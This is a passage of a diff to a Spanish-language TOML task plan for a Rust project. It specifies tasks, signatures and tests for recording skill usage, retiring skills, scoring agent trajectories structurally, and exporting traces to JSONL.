+   `format_use(u)` + `\n` (`OpenOptions::new().create(true).append(true)`). Si `u.skill` o `u.task`
+   contienen tabulador o salto de línea: `SkillError::Invalid(u.skill.clone(), "nombre con tabulador o salto de línea".into())`.
+4. `load_uses(repo_root)`: `parse_uses` del archivo; vector vacío si no existe.
+5. `retire(repo_root, name)`: mueve `<repo_root>/.claude/skills/<name>/` a
+   `<repo_root>/.pcode/skills/retiradas/<name>/` con `std::fs::rename` (creando `retiradas/`) y devuelve
+   la ruta nueva. No borra nada. Errores (`SkillError::Invalid(name, motivo)`): nombre con caracteres
+   fuera de `a-z`, `0-9`, `-` → `nombre no válido`; no existe la skill activa → `no existe`; ya hay una
+   retirada con ese nombre → `ya hay una retirada con ese nombre`.
+6. `lib.rs`: añade `load_uses`, `record_use`, `retire` y `uses_path` al `pub use governance::{…}`.
+7. Tests en `governance.rs` con el prefijo `disco_`, sobre `tempfile::tempdir()`.
+'''
+firmas = '''
+// crates/pcode-skills/src/governance.rs
+pub fn uses_path(repo_root: &std::path::Path) -> std::path::PathBuf;
+/// Añade un uso al registro.
+pub fn record_use(repo_root: &std::path::Path, u: &UseRecord) -> Result<(), crate::SkillError>;
+/// Todos los usos registrados.
+pub fn load_uses(repo_root: &std::path::Path) -> Vec<UseRecord>;
+/// Retira una skill activa moviéndola a `.pcode/skills/retiradas/`; devuelve la ruta nueva.
+pub fn retire(repo_root: &std::path::Path, name: &str) -> Result<std::path::PathBuf, crate::SkillError>;
+'''
+tests = [
+  "disco_registra_y_carga: dos `record_use` seguidos y `load_uses` devuelve los dos registros en orden",
+  "disco_sin_archivo_es_vacio: `load_uses` en un directorio vacío devuelve un vector vacío",
+  "disco_rechaza_tabuladores: un `task` con tabulador devuelve `Invalid` y no escribe nada",
+  "disco_retira_moviendo: tras `retire`, la skill está en `.pcode/skills/retiradas/<name>/SKILL.md` y no en `.claude/skills/`",
+  "disco_retirar_inexistente_es_error: un nombre que no existe da `Invalid` con `no existe`",
+  "disco_retirar_nombre_con_ruta_es_error: `../x` da `nombre no válido`",
+]
+no_hagas = [
+  "No toques la carpeta `.claude/` de este repo: los tests usan directorios temporales",
+  "No borres skills: retirar es mover",
+]
+papers = ["SkillsVote (EMNLP 2026)"]
 
 [[tarea]]
 id = "F6.04"
@@ -96,23 +511,135 @@ id = "F6.05"
 nombre = "trayectorias"
 titulo = "Puntuación estructural de trayectorias y exportación de trazas"
 fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = []
+toca = []
+acepta = "cargo test -p pcode-flow trajectory::"
+contexto = ["los informes de sus subtareas"]
+objetivo = '''
+Tarea de cierre.
+1. Ejecuta `acepta`.
+2. Comprueba que existe el informe de cada subtarea (F6.05a y F6.05b).
+3. Escribe el informe con la lista de tests que pasan.
+'''
+tests = ["(sin tests): la aceptación comprueba el conjunto"]
+papers = ["Quality, Not Just Outcome (Findings EMNLP 2026)", "ContextPilot (EMNLP 2026)", "OPEN-SWE-TRACES (Findings EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.05a"
+nombre = "trayectorias-tqs"
+titulo = "Trayectorias: puntuación estructural `tqs` en tiempo lineal y sin LLM"
+fase = "F6"
+hito = "1.7"
+talla = "M"
 ejecutor = "haiku"
 depende = ["F3.03"]
-toca = ["crates/pcode-flow/src/lib.rs", "crates/pcode-flow/src/trajectory.rs"]
-acepta = "cargo test -p pcode-flow trajectory"
-contexto = ["docs/papers.md (Quality Not Just Outcome, ContextPilot, OPEN-SWE-TRACES)"]
+toca = ["crates/pcode-flow/src/trajectory.rs", "crates/pcode-flow/src/lib.rs"]
+acepta = "cargo test -p pcode-flow trajectory::tests::tqs_"
+contexto = [
+  "crates/pcode-backends/src/types.rs (enum `TranscriptItem`: `Text(String)`, `ToolCall { name, input }`, `ToolResult { output, is_error }`)",
+]
 objetivo = '''
-1. `tqs(transcript)`: puntuación en [0, 1] en tiempo lineal y sin LLM: foco (fracción de lecturas de
-   archivos que luego se editan o citan), convergencia (si los errores disminuyen hacia el final),
-   redundancia (llamadas repetidas) y alineación intención-acción (si las tools usadas son coherentes
-   con el texto previo, por heurística simple).
-2. `export_jsonl(sessions)`: trazas en formato estable (mensajes y tool calls, incluidas las acciones
-   de `contexto`), listas para afinar un modelo propio servido por LiteLLM.
+1. Crea `trajectory.rs` con `TqsParts` y `tqs` (firmas abajo). Una sola pasada (o pocas) sobre la
+   transcripción; sin modelo ni E/S. Cada parte está en [0, 1] y más alto es mejor.
+2. `focus`: lecturas = `ToolCall` con `name == "leer"` y `input["path"]` cadena; ediciones = `ToolCall`
+   con `name` `"escribir"` o `"editar"`. De las rutas leídas DISTINTAS, fracción que después se edita o
+   cuya ruta aparece en un `Text` posterior. Sin lecturas: 1.0.
+3. `convergence`: con los `ToolResult` en orden, sea E el total con `is_error` y E2 los errores de la
+   segunda mitad (si hay n resultados, los últimos `n - n/2`). `convergence = 1 - E2/E`; sin errores: 1.0.
+4. `redundancy`: de los `ToolCall`, repetida = igual `name` e igual `input` (compara
+   `input.to_string()`) que una llamada anterior. `redundancy = 1 - repetidas/llamadas`; sin llamadas: 1.0.
+5. `alignment`: solo cuentan los `ToolCall` cuyo elemento inmediatamente anterior es un `Text`. La
+   llamada está alineada si ese texto contiene el nombre de la tool, o el nombre de archivo (lo que va
+   tras la última `/`) de `input["path"]`, o la primera palabra de `input["command"]`.
+   `alignment = alineadas/contadas`; si no cuenta ninguna: 1.0.
+6. Puntuación total = media de las cuatro partes.
+7. `lib.rs`: `pub mod trajectory;` y `pub use trajectory::{TqsParts, tqs};`.
 '''
 firmas = '''
+// crates/pcode-flow/src/trajectory.rs
+/// Partes de la puntuación de una trayectoria (cada una en [0, 1]; más alto es mejor).
+#[derive(Debug, Clone, Copy, PartialEq)]
 pub struct TqsParts { pub focus: f32, pub convergence: f32, pub redundancy: f32, pub alignment: f32 }
+
+/// Puntuación estructural de una trayectoria: (media, partes).
 pub fn tqs(transcript: &[pcode_backends::TranscriptItem]) -> (f32, TqsParts);
-pub fn export_jsonl(sessions: &[(String, Vec<pcode_models::Message>)], out: &mut dyn std::io::Write) -> std::io::Result<()>;
 '''
-tests = ["tqs_trayectoria_enfocada_alta", "tqs_redundante_baja", "export_formato_estable"]
-papers = ["Quality, Not Just Outcome (Findings EMNLP 2026)", "ContextPilot (EMNLP 2026)", "OPEN-SWE-TRACES (Findings EMNLP 2026)"]
+ejemplo = '''
+[ Text("Leo src/a.rs"), ToolCall{leer, {"path":"src/a.rs"}}, ToolResult{ok},
+  Text("Edito a.rs"),   ToolCall{editar, {"path":"src/a.rs", …}}, ToolResult{ok} ]
+  → focus 1.0 · convergence 1.0 · redundancy 1.0 · alignment 1.0 · total 1.0
+
+[ ToolCall{leer, {"path":"x"}}, ToolResult{ok}, ToolCall{leer, {"path":"x"}}, ToolResult{error} ]
+  → focus 0.0 (x no se edita ni se cita) · convergence 0.0 (el único error está en la segunda mitad)
+    · redundancy 0.5 · alignment 1.0 (ninguna llamada va tras un texto) · total 0.375
+'''
+tests = [
+  "tqs_trayectoria_enfocada_alta: el primer ejemplo da total 1.0 y las cuatro partes a 1.0",
+  "tqs_redundante_baja: el segundo ejemplo da redundancy 0.5, focus 0.0, convergence 0.0 y total 0.375",
+  "tqs_vacia_es_uno: una transcripción vacía da total 1.0",
+  "tqs_errores_al_principio_convergen: errores solo en la primera mitad de los resultados dan convergence 1.0",
+  "tqs_alineacion_parcial: dos llamadas tras texto, una nombra el archivo y otra no, dan alignment 0.5",
+  "tqs_partes_en_rango: con una transcripción mixta de 20 elementos, cada parte está entre 0 y 1",
+]
+no_hagas = ["No llames a ningún modelo", "No añadas dependencias: `pcode-backends` y `serde_json` ya están en el crate"]
+papers = ["Quality, Not Just Outcome (Findings EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.05b"
+nombre = "trayectorias-exportar"
+titulo = "Trayectorias: exportar trazas a JSONL en formato estable"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.05a"]
+toca = ["crates/pcode-flow/src/trajectory.rs", "crates/pcode-flow/src/lib.rs"]
+acepta = "cargo test -p pcode-flow trajectory::tests::export_"
+contexto = [
+  "crates/pcode-flow/src/trajectory.rs (`tqs(transcript) -> (f32, TqsParts)`: ya existe)",
+  "crates/pcode-backends/src/types.rs (enum `TranscriptItem`: `Text(String)`, `ToolCall { name, input }`, `ToolResult { output, is_error }`)",
+]
+objetivo = '''
+1. En `trajectory.rs` añade `EXPORT_VERSION` y `export_jsonl` (firmas abajo).
+2. `export_jsonl(sessions, out)`: por cada sesión `(id, transcripción)` escribe UNA línea JSON (con
+   `serde_json::json!` y `writeln!`) con las claves, en español y estables:
+   `{"version":1,"id":"<id>","tqs":<total con 3 decimales>,"elementos":[…]}`. Cada elemento es:
+   - `Text(t)` → `{"tipo":"texto","texto":t}`
+   - `ToolCall{name,input}` → `{"tipo":"llamada","tool":name,"entrada":input}`
+   - `ToolResult{output,is_error}` → `{"tipo":"resultado","salida":output,"error":is_error}`
+   `tqs` es el total de `tqs(transcripción)` redondeado a 3 decimales
+   (`(x * 1000.0).round() / 1000.0`).
+3. Las sesiones se escriben en el orden recibido; una lista vacía no escribe nada. Los errores de
+   escritura se propagan.
+4. `lib.rs`: añade `EXPORT_VERSION` y `export_jsonl` al `pub use trajectory::{…}`.
+5. Tests con el prefijo `export_` escribiendo en un `Vec<u8>` y volviendo a leer cada línea con
+   `serde_json::from_str::<serde_json::Value>`.
+'''
+firmas = '''
+// crates/pcode-flow/src/trajectory.rs
+/// Versión del formato de exportación (cambia solo si se rompe la compatibilidad).
+pub const EXPORT_VERSION: u32 = 1;
+
+/// Escribe una línea JSON por sesión: trazas listas para analizar o afinar un modelo propio.
+pub fn export_jsonl(sessions: &[(String, Vec<pcode_backends::TranscriptItem>)], out: &mut dyn std::io::Write)
+    -> std::io::Result<()>;
+'''
+ejemplo = '''
+sesión ("s1", [Text("hola"), ToolCall{name:"leer", input:{"path":"a"}}, ToolResult{output:"x", is_error:false}])
+→ una línea cuyo JSON tiene: version 1 · id "s1" · tqs entre 0 y 1 ·
+  elementos[0] = {"tipo":"texto","texto":"hola"} ·
+  elementos[1] = {"tipo":"llamada","tool":"leer","entrada":{"path":"a"}} ·
+  elementos[2] = {"tipo":"resultado","salida":"x","error":false}
+'''
+tests = [
+  "export_formato_estable: la sesión del ejemplo produce una línea con `version` 1, `id` s1 y los tres elementos con esas claves exactas",
+  "export_una_linea_por_sesion: dos sesiones producen dos líneas, en el orden recibido, cada una JSON válido",
+  "export_vacio_no_escribe: una lista vacía deja el `Vec<u8>` vacío",
+  "export_incluye_tqs_redondeado: el campo `tqs` tiene como mucho 3 decimales y coincide con `tqs()` redondeado",
+  "export_salida_con_saltos_de_linea: un `output` con saltos de línea sigue ocupando una sola línea del archivo",
+]
+no_hagas = ["No cambies los nombres de las claves: el formato es estable", "No leas sesiones del store en esta tarea: llegan como argumento"]
+papers = ["OPEN-SWE-TRACES (Findings EMNLP 2026)", "ContextPilot (EMNLP 2026)"]
